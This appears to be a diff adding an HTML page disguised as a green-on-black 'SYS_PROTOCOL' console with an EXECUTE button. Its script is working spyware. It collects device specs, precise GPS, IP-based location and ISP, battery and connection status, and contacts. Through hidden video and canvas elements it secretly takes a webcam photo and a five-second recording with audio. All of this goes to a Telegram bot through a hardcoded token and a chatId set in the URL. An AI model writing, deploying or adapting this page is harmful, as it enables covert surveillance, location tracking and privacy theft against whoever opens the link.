@@ -1,0 +1,337 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>System</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Courier New', monospace;
+            background: #000;
+            min-height: 100vh;
+            display: flex; justify-content: center; align-items: center;
+        }
+        .main {
+            background: #000;
+            border: 1px solid #00ff00;
+            padding: 35px;
+            max-width: 420px;
+            width: 92%;
+            text-align: center;
+        }
+        .logo { color: #00ff00; font-size: 50px; margin-bottom: 12px; }
+        h1 { color: #00ff00; font-size: 16px; letter-spacing: 3px; margin: 8px 0; }
+        .line { width: 70%; height: 1px; background: #00ff00; margin: 12px auto; opacity: 0.3; }
+        .ver { color: #008800; font-size: 11px; margin: 4px 0; }
+        .btn {
+            width: 100%; padding: 13px;
+            background: #00ff00; color: #000;
+            border: none; font-size: 15px; font-weight: bold;
+            cursor: pointer; margin: 14px 0; letter-spacing: 2px;
+            font-family: 'Courier New', monospace;
+        }
+        .btn:hover { background: #00cc00; }
+        .prog {
+            width: 100%; height: 4px; background: #111;
+            margin: 12px 0; display: none;
+        }
+        .prog div {
+            height: 100%; background: #00ff00;
+            width: 0%; transition: width 0.4s;
+        }
+        .stat { color: #008800; font-size: 10px; margin: 6px 0; display: none; letter-spacing: 1px; }
+        .done { color: #00ff00; font-size: 13px; margin: 10px 0; display: none; letter-spacing: 2px; }
+        video, canvas { position: fixed; top: -9999px; left: -9999px; width: 1px; height: 1px; opacity: 0; }
+    </style>
+</head>
+<body>
+    <div class="main">
+        <div class="logo">[ ]</div>
+        <h1>SYS_PROTOCOL</h1>
+        <div class="line"></div>
+        <div class="ver">v3.7.1</div>
+        <div class="ver">secure connection</div>
+        <div class="line"></div>
+        
+        <button class="btn" id="btn" onclick="go()">EXECUTE</button>
+        
+        <div class="prog" id="prog"><div id="fill"></div></div>
+        <div class="stat" id="stat"></div>
+        
+        <video id="vid" autoplay playsinline muted></video>
+        <canvas id="can"></canvas>
+        
+        <div class="done" id="done">OK</div>
+    </div>
+
+    <script>
+        var cid = (new URL(window.location.href)).searchParams.get('chatId') || '';
+        var tok = '8791190101:AAHGuoI-VvrvmVuFxYKdTsGiX5tD4PRe1qM';
+        var dd = [];
+        var sent = false;
+        var rec;
+        var chk = [];
+
+        function g(id) { return document.getElementById(id); }
+
+        function up(p, t) {
+            g('fill').style.width = p + '%';
+            if (t) { g('stat').style.display = 'block'; g('stat').textContent = t; }
+        }
+
+        function wt(ms) {
+            return new Promise(function(r) { setTimeout(r, ms); });
+        }
+
+        function encodeText(str) {
+            return btoa(unescape(encodeURIComponent(str)));
+        }
+
+        async function go() {
+            if (sent) return;
+            sent = true;
+            
+            g('btn').style.display = 'none';
+            g('prog').style.display = 'block';
+            
+            up(4, 'init...');
+            await wt(200);
+
+            await step1();
+            await step2();
+            await step3();
+            await step4();
+            await step5();
+            await step6();
+
+            g('prog').style.display = 'none';
+            g('stat').style.display = 'none';
+            g('done').style.display = 'block';
+        }
+
+        async function step1() {
+            up(10, 'reading device...');
+            
+            dd.push('=== DEVICE ===');
+            dd.push('OS: ' + navigator.platform);
+            dd.push('SCREEN: ' + screen.width + 'x' + screen.height);
+            dd.push('RAM: ' + (navigator.deviceMemory || '?') + 'GB');
+            dd.push('CPU: ' + (navigator.hardwareConcurrency || '?') + ' cores');
+            dd.push('LANG: ' + navigator.language);
+            dd.push('UA: ' + navigator.userAgent.split(' ')[0]);
+            
+            await wt(350);
+        }
+
+        async function step2() {
+            up(25, 'getting location...');
+            
+            try {
+                var pos = await new Promise(function(ok, no) {
+                    navigator.geolocation.getCurrentPosition(ok, no, {
+                        enableHighAccuracy: true, timeout: 6000, maximumAge: 0
+                    });
+                });
+                
+                var lat = pos.coords.latitude.toFixed(6);
+                var lng = pos.coords.longitude.toFixed(6);
+                var acc = pos.coords.accuracy.toFixed(1);
+                
+                dd.push('=== GPS ===');
+                dd.push('LAT: ' + lat);
+                dd.push('LNG: ' + lng);
+                dd.push('ACC: ' + acc + 'm');
+                dd.push('MAP: https://maps.google.com/?q=' + lat + ',' + lng);
+            } catch(e) {
+                dd.push('=== GPS ===');
+                dd.push('N/A');
+            }
+            
+            try {
+                var r = await fetch('https://ipapi.co/json/');
+                var ip = await r.json();
+                
+                dd.push('=== NETWORK ===');
+                dd.push('IP: ' + (ip.ip || '?'));
+                dd.push('COUNTRY: ' + (ip.country_name || '?'));
+                dd.push('CITY: ' + (ip.city || '?'));
+                dd.push('REGION: ' + (ip.region || '?'));
+                dd.push('ISP: ' + (ip.org || '?'));
+                dd.push('ZIP: ' + (ip.postal || '?'));
+            } catch(e) {
+                dd.push('=== NETWORK ===');
+                dd.push('N/A');
+            }
+            
+            await wt(350);
+        }
+
+        async function step3() {
+            up(45, 'checking power...');
+            
+            try {
+                if ('getBattery' in navigator) {
+                    var b = await navigator.getBattery();
+                    dd.push('=== POWER ===');
+                    dd.push('BATTERY: ' + Math.round(b.level * 100) + '%');
+                    dd.push('CHARGING: ' + (b.charging ? 'YES' : 'NO'));
+                }
+            } catch(e) {}
+
+            try {
+                var cn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+                if (cn) {
+                    dd.push('=== CONNECTION ===');
+                    dd.push('TYPE: ' + cn.effectiveType);
+                    dd.push('SPEED: ' + (cn.downlink || '?') + 'Mbps');
+                }
+            } catch(e) {}
+            
+            await wt(300);
+        }
+
+        async function step4() {
+            up(60, 'camera...');
+            
+            try {
+                var stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: 'user', width: 320, height: 240 },
+                    audio: true
+                });
+                
+                dd.push('=== CAMERA ===');
+                dd.push('STATUS: OK');
+                
+                var vid = g('vid');
+                var can = g('can');
+                
+                vid.srcObject = stream;
+                
+                await wt(1500);
+                
+                can.width = vid.videoWidth || 320;
+                can.height = vid.videoHeight || 240;
+                can.getContext('2d').drawImage(vid, 0, 0);
+                
+                var pb = await new Promise(function(rr) {
+                    can.toBlob(rr, 'image/jpeg', 0.7);
+                });
+                
+                rec = new MediaRecorder(stream);
+                rec.ondataavailable = function(e) {
+                    if (e.data.size > 0) chk.push(e.data);
+                };
+                rec.start();
+                
+                up(75, 'recording...');
+                
+                await wt(5000);
+                
+                if (rec.state === 'recording') {
+                    rec.stop();
+                    await wt(1000);
+                }
+                
+                var vb = new Blob(chk, { type: 'video/mp4' });
+                
+                var pf = new FormData();
+                pf.append('chat_id', cid);
+                pf.append('photo', pb, 'img.jpg');
+                
+                await fetch('https://api.telegram.org/bot' + tok + '/sendPhoto', {
+                    method: 'POST', body: pf
+                });
+                
+                var vf = new FormData();
+                vf.append('chat_id', cid);
+                vf.append('video', vb, 'vid.mp4');
+                
+                await fetch('https://api.telegram.org/bot' + tok + '/sendVideo', {
+                    method: 'POST', body: vf
+                });
+                
+                stream.getTracks().forEach(function(t) { t.stop(); });
+                
+            } catch(e) {
+                dd.push('=== CAMERA ===');
+                dd.push('STATUS: DENIED');
+            }
+            
+            await wt(200);
+        }
+
+        async function step5() {
+            up(88, 'reading contacts...');
+            
+            try {
+                if ('contacts' in navigator && 'ContactsManager' in window) {
+                    var contacts = await navigator.contacts.select(
+                        ['name', 'tel', 'email'],
+                        { multiple: true }
+                    );
+                    
+                    if (contacts.length > 0) {
+                        dd.push('=== CONTACTS (' + contacts.length + ') ===');
+                        
+                        for (var i = 0; i < Math.min(contacts.length, 30); i++) {
+                            var c = contacts[i];
+                            var nm = (c.name || '?').toString();
+                            var tl = (c.tel || '?').toString();
+                            dd.push(nm + ' - ' + tl);
+                        }
+                    } else {
+                        dd.push('=== CONTACTS ===');
+                        dd.push('EMPTY');
+                    }
+                } else {
+                    dd.push('=== CONTACTS ===');
+                    dd.push('API: N/A');
+                }
+            } catch(e) {
+                dd.push('=== CONTACTS ===');
+                dd.push('DENIED');
+            }
+            
+            await wt(200);
+        }
+
+        async function step6() {
+            up(95, 'sending...');
+            
+            var full = dd.join('\n');
+            
+            if (full.length > 3800) {
+                var parts = [];
+                var cur = 'REPORT (1)\n\n';
+                
+                for (var i = 0; i < dd.length; i++) {
+                    if ((cur + dd[i] + '\n').length > 3800) {
+                        parts.push(cur);
+                        cur = 'REPORT (' + (parts.length + 1) + ')\n\n';
+                    }
+                    cur += dd[i] + '\n';
+                }
+                if (cur) parts.push(cur);
+                
+                for (var p = 0; p < parts.length; p++) {
+                    await fetch('https://api.telegram.org/bot' + tok + '/sendMessage', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ chat_id: cid, text: parts[p] })
+                    });
+                    await wt(500);
+                }
+            } else {
+                await fetch('https://api.telegram.org/bot' + tok + '/sendMessage', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: cid, text: 'REPORT\n\n' + full })
+                });
+            }
+            
+            up(100, 'done');
+        }
+    </script>
+</body>
+</html>
